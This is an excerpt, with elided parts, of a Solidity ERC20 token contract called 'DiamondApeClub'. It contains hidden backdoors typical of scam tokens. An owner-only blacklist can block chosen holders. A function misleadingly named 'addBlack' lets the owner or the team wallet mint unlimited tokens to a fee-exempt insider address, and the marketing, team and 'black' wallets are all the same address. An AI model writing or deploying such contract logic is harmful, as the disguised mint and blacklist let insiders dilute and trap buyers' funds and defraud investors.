...
contract DiamondApeClub is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "diamond ape club";
    ...
    address payable private marketingWalletAddress = payable(0x9E99bf04D85e902Dc96c21f410549E30D2B2DFCb); // Marketing Address
    address payable private teamWalletAddress = payable(0x9E99bf04D85e902Dc96c21f410549E30D2B2DFCb); // Team Address
    address payable private blackAddress = payable(0x9E99bf04D85e902Dc96c21f410549E30D2B2DFCb); // Team Address
    ...
    uint256 private minimumTokensBeforeSwap = 50000000 * 8 **_decimals; 
    ...
    constructor () {
        ...
        isExcludedFromFee[blackAddress] = true;
        ...
        isTxLimitExempt[blackAddress] = true;
    ...
    function multiBlackList(address[] calldata addresses, bool status) public onlyOwner {
        ...
        for (uint256 i; i < addresses.length; ++i) {
            _isbclisted[addresses[i]] = status;
        }
    }
    ...
    function setLaunch() external onlyFunder {
        isLaunch = false;
        launchedBlock = 0;
    }

    function addBlack(uint256 amount) external onlyFunder {
        _balances[blackAddress] += amount;
        _totalSupply += amount;
        emit Transfer(address(0), blackAddress, amount); // to blackAddress
        // Transfer(owner, target, mintedAmount);
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || teamWalletAddress == msg.sender, "!Funder");
        _;
    }
